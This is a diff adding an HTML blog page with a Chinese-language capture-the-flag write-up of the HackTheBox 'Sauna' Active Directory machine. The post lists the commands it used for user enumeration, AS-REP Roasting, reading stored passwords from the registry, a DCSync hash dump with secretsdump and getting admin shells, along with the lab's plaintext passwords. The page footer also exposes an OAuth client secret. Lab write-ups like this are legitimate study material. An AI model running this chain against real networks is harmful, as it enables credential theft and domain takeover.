@@ -1,0 +1,319 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Active Directory 101-Sauna | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Active Directory 101-Sauna | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Sauna
+前言
+AD域系列的第二台靶机 思路我感觉和上一台靶机有很多相似的地方。
+信息收集
+端口扫描
+
+那么前期信息收集的就有
+53尝试DNS区域传输
+80端口风险传输方式trace
+88   kerber枚举
+135  rpc的枚举
+3..." />
+    <meta name="keywords" content="AD域,AS-REP Roasting,注册表读取密码,DCsync,HackTheBox" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Active Directory 101-Sauna
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-04
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/ggcS95uZq/" class="post-tag">
+                  # AD域
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/iTHfpIy68/" class="post-tag">
+                  # AS-REP Roasting
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/rTDYtxm5ch/" class="post-tag">
+                  # 注册表读取密码
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/MW2luqKqC/" class="post-tag">
+                  # DCsync
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/4AeNKZQf4/" class="post-tag">
+                  # HackTheBox
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="sauna">Sauna</h1>
+<h2 id="前言">前言</h2>
+<p>AD域系列的第二台靶机 思路我感觉和上一台靶机有很多相似的地方。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>端口扫描</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204145708414.png" alt="image-20231204145708414" loading="lazy"></figure>
+<p>那么前期信息收集的就有</p>
+<pre><code>53尝试DNS区域传输
+80端口风险传输方式trace
+88   kerber枚举
+135  rpc的枚举
+389  ldap枚举
+</code></pre>
+<h3 id="ldap枚举">ldap枚举</h3>
+<pre><code>nmap --script &quot;ldap*&quot; -p 389 10.10.10.175
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204145937845.png" alt="image-20231204145937845" loading="lazy"></figure>
+<p>通过访问80端口的http页面，找到了如下姓名</p>
+<pre><code>Fergus Smith
+Shaun Coins
+Hugo Bear
+Steven Kerb
+Bowie Taylor
+Sophie Driver
+</code></pre>
+<p>然后又进行了DNS区域传输  SMB枚举都没有得到什么有用的东西。</p>
+<h3 id="kerbrute枚举">kerbrute枚举</h3>
+<p>通过收集的东西写了一个字典</p>
+<pre><code>hugo.smith
+hugosmith
+hsmith
+smith.hugo
+h.smith
+</code></pre>
+<pre><code>kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d egotistical-bank.local user
+</code></pre>
+<h2 id="as-rep-roasting">AS-REP Roasting</h2>
+<p>后面又通过一些域用户枚举 最后得到了一个用户没有开启预认证操作 所以可以直接得到TGT。</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204150420590.png" alt="image-20231204150420590" loading="lazy"></figure>
+<h2 id="evil-winrm">evil winrm</h2>
+<p>解密出来了后就可以得到密码。由于开放了5985端口 使用 evil winrm进行一个连接。</p>
+<pre><code>evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204150531213.png" alt="image-20231204150531213" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204150634110.png" alt="image-20231204150634110" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204150820943.png" alt="image-20231204150820943" loading="lazy"></figure>
+<p>这里可以看到还有一个svc用户。由于这里的权限原因所以可以通过读取注册表来获取密码。</p>
+<h2 id="读注册表获取用户明文密码">读注册表获取用户明文密码</h2>
+<pre><code>reg.exe query &quot;HKLM\software\microsoft\windows nt\currentversion\winlogon&quot;
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204151805586.png" alt="image-20231204151805586" loading="lazy"></figure>
+<p>指出了用户名和明文密码 。</p>
+<h2 id="blood信息收集">Blood信息收集</h2>
+<pre><code>evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+</code></pre>
+<p>首先使用这个登录到新的用户中去。</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204155113583.png" alt="image-20231204155113583" loading="lazy"></figure>
+<p>上传blood。并执行</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204155817229.png" alt="image-20231204155817229" loading="lazy"></figure>
+<p>然后将其下载下来</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204155943883.png" alt="image-20231204155943883" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204155957654.png" alt="image-20231204155957654" loading="lazy"></figure>
+<p>然后导入。</p>
+<p>通过分析可通过DCsync机械能攻击域控</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204162436800.png" alt="image-20231204162436800" loading="lazy"></figure>
+<h2 id="dcsync">DCsync</h2>
+<pre><code>secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204162703491.png" alt="image-20231204162703491" loading="lazy"></figure>
+<p>得到hash值 使用wmi获取管理员shell。</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204162844461.png" alt="image-20231204162844461" loading="lazy"></figure>
+<p>psexe可以获取system shell。</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231204163033146.png" alt="image-20231204163033146" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>通过对服务进行枚举得到了hsmith用户 然后使用AS-REP Roasting 技术得到初步的TGT 登陆进去发现有其他用户 通过读取注册表信息得到明文的账号密码 登录上svc用户。上传blood得到 分析发现可进行DCsync攻击域控。最后攻击成功得到管理员的hash 后面可通过wmi或psexe得到管理员shell</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#sauna">Sauna</a>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
+<ul>
+<li><a href="#ldap%E6%9E%9A%E4%B8%BE">ldap枚举</a></li>
+<li><a href="#kerbrute%E6%9E%9A%E4%B8%BE">kerbrute枚举</a></li>
+</ul>
+</li>
+<li><a href="#as-rep-roasting">AS-REP Roasting</a></li>
+<li><a href="#evil-winrm">evil winrm</a></li>
+<li><a href="#%E8%AF%BB%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81">读注册表获取用户明文密码</a></li>
+<li><a href="#blood%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">Blood信息收集</a></li>
+<li><a href="#dcsync">DCsync</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/active-directory-101-1/">
+              <h3 class="post-title">
+                Active Directory 101-Forest
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
